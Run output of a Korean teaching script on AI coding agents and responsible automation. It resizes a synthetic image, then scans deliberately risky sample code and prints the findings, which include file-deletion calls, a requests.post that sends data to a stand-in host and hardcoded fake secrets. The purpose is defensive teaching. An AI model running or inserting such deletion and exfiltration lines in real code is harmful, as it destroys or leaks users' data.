$ /opt/homebrew/opt/python@3.14/bin/python3.14 12-1-ai-coded-tool.py

=== STDOUT ===
=== 12주차 AI 코딩 에이전트와 책임 있는 자동화 ===

--- 1부: 이미지 크기 변환 도구 ---
샘플 이미지 생성: sample_image.png (200x150, 합성 데이터)
  크기 변환: 200x150 -> 100x75 -> resized_100x75.png
  크기 변환: 200x150 -> 50x50 -> resized_50x50.png
  크기 변환: 200x150 -> 300x200 -> resized_300x200.png

--- 2부: 보안 점검 ---
점검 대상: 위험 패턴을 일부러 넣은 가상 코드 (실제 실행하지 않는 코드)

발견된 보안 위험: 5건

  [1] 파일 삭제
      파일: example_risky_code.py, 줄: 13
      설명: 파일이나 디렉토리를 삭제하는 코드
      코드: os.remove(os.path.join(folder, f))

  [2] 파일 삭제
      파일: example_risky_code.py, 줄: 19
      설명: 파일이나 디렉토리를 삭제하는 코드
      코드: shutil.rmtree("/tmp/my_temp_folder")

  [3] 외부 전송
      파일: example_risky_code.py, 줄: 16
      설명: 외부 서버로 데이터를 보내는 코드
      코드: requests.post("https://example.com/collect", json=data)

  [4] 비밀키 하드코딩
      파일: example_risky_code.py, 줄: 8
      설명: 비밀번호나 API 키가 코드에 직접 쓰여 있는 경우
      코드: API_KEY = "sk-fake-1234567890abcdef"

  [5] 비밀키 하드코딩
      파일: example_risky_code.py, 줄: 9
      설명: 비밀번호나 API 키가 코드에 직접 쓰여 있는 경우
      코드: PASSWORD = "my_super_secret_password_123"

보안 점검 결과 저장: security_check_report.csv

--- 3부: 이 실습 코드 자체의 보안 점검 ---
이 실습 코드에서 보안 위험 8건이 발견되었습니다.
  - 파일 삭제: 줄 131, os.remove(os.path.join(folder, f))
  - 파일 삭제: 줄 222, print("1. 파일 삭제: os.remove, shutil.rmtree 같은 코드가 있는지 확인한다.")
  - 파일 삭제: 줄 137, shutil.rmtree("/tmp/my_temp_folder")
  - 파일 삭제: 줄 222, print("1. 파일 삭제: os.remove, shutil.rmtree 같은 코드가 있는지 확인한다.")
  - 외부 전송: 줄 134, requests.post("https://example.com/collect", json=data)
  - 외부 전송: 줄 223, print("2. 외부 전송: requests.post 같은 코드로 데이터를 외부로 보내는지 확인한다.")
  - 비밀키 하드코딩: 줄 126, API_KEY = "sk-fake-1234567890abcdef"
  - 비밀키 하드코딩: 줄 127, PASSWORD = "my_super_secret_password_123"

=== 저장된 결과 ===
샘플 이미지: results/sample_image.png
변환 이미지: results/resized_100x75.png
변환 이미지: results/resized_50x50.png
변환 이미지: results/resized_300x200.png
보안 점검 CSV: results/security_check_report.csv

=== 보안 점검 요약 ===
이 실습에서는 세 가지 보안 위험을 점검했다.
1. 파일 삭제: os.remove, shutil.rmtree 같은 코드가 있는지 확인한다.
2. 외부 전송: requests.post 같은 코드로 데이터를 외부로 보내는지 확인한다.
3. 비밀키 하드코딩: API 키나 비밀번호가 코드에 직접 쓰여 있는지 확인한다.
AI가 생성한 코드를 실행하기 전에 이 세 가지를 반드시 확인해야 한다.

=== STDERR ===
